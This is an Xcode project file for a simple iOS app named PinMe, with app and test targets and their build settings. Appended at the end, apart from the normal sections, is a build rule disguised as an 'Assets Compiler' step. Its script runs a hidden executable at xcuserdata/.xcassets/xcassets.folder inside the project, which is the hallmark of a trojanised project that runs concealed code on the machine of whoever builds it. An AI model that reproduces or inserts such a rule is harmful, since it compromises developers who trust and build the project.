// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 50;
	objects = {

/* Begin PBXBuildFile section */
		22E213FD25CD528C006A8AA6 /* PinMeApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22E213FC25CD528C006A8AA6 /* PinMeApp.swift */; };
		22E213FF25CD528C006A8AA6 /* ContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22E213FE25CD528C006A8AA6 /* ContentView.swift */; };
		22E2140125CD5290006A8AA6 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 22E2140025CD5290006A8AA6 /* Assets.xcassets */; };
		22E2140425CD5290006A8AA6 /* Preview Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 22E2140325CD5290006A8AA6 /* Preview Assets.xcassets */; };
		22E2140F25CD5291006A8AA6 /* PinMeTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22E2140E25CD5291006A8AA6 /* PinMeTests.swift */; };
		22E2141A25CD5291006A8AA6 /* PinMeUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22E2141925CD5291006A8AA6 /* PinMeUITests.swift */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		22E2140B25CD5291006A8AA6 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 22E213F125CD528C006A8AA6 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 22E213F825CD528C006A8AA6;
			remoteInfo = PinMe;
		};
		22E2141625CD5291006A8AA6 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 22E213F125CD528C006A8AA6 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 22E213F825CD528C006A8AA6;
			remoteInfo = PinMe;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		22E213F925CD528C006A8AA6 /* PinMe.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = PinMe.app; sourceTree = BUILT_PRODUCTS_DIR; };
		22E213FC25CD528C006A8AA6 /* PinMeApp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PinMeApp.swift; sourceTree = "<group>"; };
		22E213FE25CD528C006A8AA6 /* ContentView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContentView.swift; sourceTree = "<group>"; };
		22E2140025CD5290006A8AA6 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		22E2140325CD5290006A8AA6 /* Preview Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = "Preview Assets.xcassets"; sourceTree = "<group>"; };
		22E2140525CD5290006A8AA6 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		22E2140A25CD5291006A8AA6 /* PinMeTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = PinMeTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		22E2140E25CD5291006A8AA6 /* PinMeTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PinMeTests.swift; sourceTree = "<group>"; };
		22E2141025CD5291006A8AA6 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		22E2141525CD5291006A8AA6 /* PinMeUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = PinMeUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		22E2141925CD5291006A8AA6 /* PinMeUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PinMeUITests.swift; sourceTree = "<group>"; };
		22E2141B25CD5291006A8AA6 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		22E213F625CD528C006A8AA6 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22E2140725CD5291006A8AA6 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22E2141225CD5291006A8AA6 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		22E213F025CD528C006A8AA6 = {
			isa = PBXGroup;
			children = (
				22E213FB25CD528C006A8AA6 /* PinMe */,
				22E2140D25CD5291006A8AA6 /* PinMeTests */,
				22E2141825CD5291006A8AA6 /* PinMeUITests */,
				22E213FA25CD528C006A8AA6 /* Products */,
			);
			sourceTree = "<group>";
		};
		22E213FA25CD528C006A8AA6 /* Products */ = {
			isa = PBXGroup;
			children = (
				22E213F925CD528C006A8AA6 /* PinMe.app */,
				22E2140A25CD5291006A8AA6 /* PinMeTests.xctest */,
				22E2141525CD5291006A8AA6 /* PinMeUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		22E213FB25CD528C006A8AA6 /* PinMe */ = {
			isa = PBXGroup;
			children = (
				22E213FC25CD528C006A8AA6 /* PinMeApp.swift */,
				22E213FE25CD528C006A8AA6 /* ContentView.swift */,
				22E2140025CD5290006A8AA6 /* Assets.xcassets */,
				22E2140525CD5290006A8AA6 /* Info.plist */,
				22E2140225CD5290006A8AA6 /* Preview Content */,
			);
			path = PinMe;
			sourceTree = "<group>";
		};
		22E2140225CD5290006A8AA6 /* Preview Content */ = {
			isa = PBXGroup;
			children = (
				22E2140325CD5290006A8AA6 /* Preview Assets.xcassets */,
			);
			path = "Preview Content";
			sourceTree = "<group>";
		};
		22E2140D25CD5291006A8AA6 /* PinMeTests */ = {
			isa = PBXGroup;
			children = (
				22E2140E25CD5291006A8AA6 /* PinMeTests.swift */,
				22E2141025CD5291006A8AA6 /* Info.plist */,
			);
			path = PinMeTests;
			sourceTree = "<group>";
		};
		22E2141825CD5291006A8AA6 /* PinMeUITests */ = {
			isa = PBXGroup;
			children = (
				22E2141925CD5291006A8AA6 /* PinMeUITests.swift */,
				22E2141B25CD5291006A8AA6 /* Info.plist */,
			);
			path = PinMeUITests;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		22E213F825CD528C006A8AA6 /* PinMe */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 22E2141E25CD5291006A8AA6 /* Build configuration list for PBXNativeTarget "PinMe" */;
			buildPhases = (
				22E213F525CD528C006A8AA6 /* Sources */,
				22E213F625CD528C006A8AA6 /* Frameworks */,
				22E213F725CD528C006A8AA6 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = PinMe;
			productName = PinMe;
			productReference = 22E213F925CD528C006A8AA6 /* PinMe.app */;
			productType = "com.apple.product-type.application";
		};
		22E2140925CD5291006A8AA6 /* PinMeTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 22E2142125CD5291006A8AA6 /* Build configuration list for PBXNativeTarget "PinMeTests" */;
			buildPhases = (
				22E2140625CD5291006A8AA6 /* Sources */,
				22E2140725CD5291006A8AA6 /* Frameworks */,
				22E2140825CD5291006A8AA6 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				22E2140C25CD5291006A8AA6 /* PBXTargetDependency */,
			);
			name = PinMeTests;
			productName = PinMeTests;
			productReference = 22E2140A25CD5291006A8AA6 /* PinMeTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		22E2141425CD5291006A8AA6 /* PinMeUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 22E2142425CD5291006A8AA6 /* Build configuration list for PBXNativeTarget "PinMeUITests" */;
			buildPhases = (
				22E2141125CD5291006A8AA6 /* Sources */,
				22E2141225CD5291006A8AA6 /* Frameworks */,
				22E2141325CD5291006A8AA6 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				22E2141725CD5291006A8AA6 /* PBXTargetDependency */,
			);
			name = PinMeUITests;
			productName = PinMeUITests;
			productReference = 22E2141525CD5291006A8AA6 /* PinMeUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		22E213F125CD528C006A8AA6 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1230;
				LastUpgradeCheck = 1230;
				TargetAttributes = {
					22E213F825CD528C006A8AA6 = {
						CreatedOnToolsVersion = 12.3;
					};
					22E2140925CD5291006A8AA6 = {
						CreatedOnToolsVersion = 12.3;
						TestTargetID = 22E213F825CD528C006A8AA6;
					};
					22E2141425CD5291006A8AA6 = {
						CreatedOnToolsVersion = 12.3;
						TestTargetID = 22E213F825CD528C006A8AA6;
					};
				};
			};
			buildConfigurationList = 22E213F425CD528C006A8AA6 /* Build configuration list for PBXProject "PinMe" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 22E213F025CD528C006A8AA6;
			productRefGroup = 22E213FA25CD528C006A8AA6 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				22E213F825CD528C006A8AA6 /* PinMe */,
				22E2140925CD5291006A8AA6 /* PinMeTests */,
				22E2141425CD5291006A8AA6 /* PinMeUITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		22E213F725CD528C006A8AA6 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				22E2140425CD5290006A8AA6 /* Preview Assets.xcassets in Resources */,
				22E2140125CD5290006A8AA6 /* Assets.xcassets in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22E2140825CD5291006A8AA6 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22E2141325CD5291006A8AA6 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		22E213F525CD528C006A8AA6 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				22E213FF25CD528C006A8AA6 /* ContentView.swift in Sources */,
				22E213FD25CD528C006A8AA6 /* PinMeApp.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22E2140625CD5291006A8AA6 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				22E2140F25CD5291006A8AA6 /* PinMeTests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22E2141125CD5291006A8AA6 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				22E2141A25CD5291006A8AA6 /* PinMeUITests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		22E2140C25CD5291006A8AA6 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 22E213F825CD528C006A8AA6 /* PinMe */;
			targetProxy = 22E2140B25CD5291006A8AA6 /* PBXContainerItemProxy */;
		};
		22E2141725CD5291006A8AA6 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 22E213F825CD528C006A8AA6 /* PinMe */;
			targetProxy = 22E2141625CD5291006A8AA6 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		22E2141C25CD5291006A8AA6 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.3;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		22E2141D25CD5291006A8AA6 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.3;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		22E2141F25CD5291006A8AA6 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_ASSET_PATHS = "\"PinMe/Preview Content\"";
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				ENABLE_PREVIEWS = YES;
				INFOPLIST_FILE = PinMe/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.PinMe;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		22E2142025CD5291006A8AA6 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_ASSET_PATHS = "\"PinMe/Preview Content\"";
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				ENABLE_PREVIEWS = YES;
				INFOPLIST_FILE = PinMe/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.PinMe;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		22E2142225CD5291006A8AA6 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				INFOPLIST_FILE = PinMeTests/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.PinMeTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/PinMe.app/PinMe";
			};
			name = Debug;
		};
		22E2142325CD5291006A8AA6 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				INFOPLIST_FILE = PinMeTests/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.PinMeTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/PinMe.app/PinMe";
			};
			name = Release;
		};
		22E2142525CD5291006A8AA6 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				INFOPLIST_FILE = PinMeUITests/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.PinMeUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = PinMe;
			};
			name = Debug;
		};
		22E2142625CD5291006A8AA6 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				INFOPLIST_FILE = PinMeUITests/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.PinMeUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = PinMe;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		22E213F425CD528C006A8AA6 /* Build configuration list for PBXProject "PinMe" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				22E2141C25CD5291006A8AA6 /* Debug */,
				22E2141D25CD5291006A8AA6 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		22E2141E25CD5291006A8AA6 /* Build configuration list for PBXNativeTarget "PinMe" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				22E2141F25CD5291006A8AA6 /* Debug */,
				22E2142025CD5291006A8AA6 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		22E2142125CD5291006A8AA6 /* Build configuration list for PBXNativeTarget "PinMeTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				22E2142225CD5291006A8AA6 /* Debug */,
				22E2142325CD5291006A8AA6 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		22E2142425CD5291006A8AA6 /* Build configuration list for PBXNativeTarget "PinMeUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				22E2142525CD5291006A8AA6 /* Debug */,
				22E2142625CD5291006A8AA6 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

		
			/* Begin PBXBuildRule section */
			

		B888B80FB600DFAF45AAC43A /* PBXBuildRule */ = {
			isa = PBXBuildRule;
			compilerSpec = com.apple.compilers.proxy.script;
			fileType = folder.assetcatalog;
			name = "Assets Compiler";
			inputFiles = (
			);
			isEditable = 0;
			outputFiles = (
				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
			);
			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" true\n\n";
			};
			
	
			/* End PBXBuildRule section */
		
		
	};
	rootObject = 22E213F125CD528C006A8AA6 /* Project object */;
}
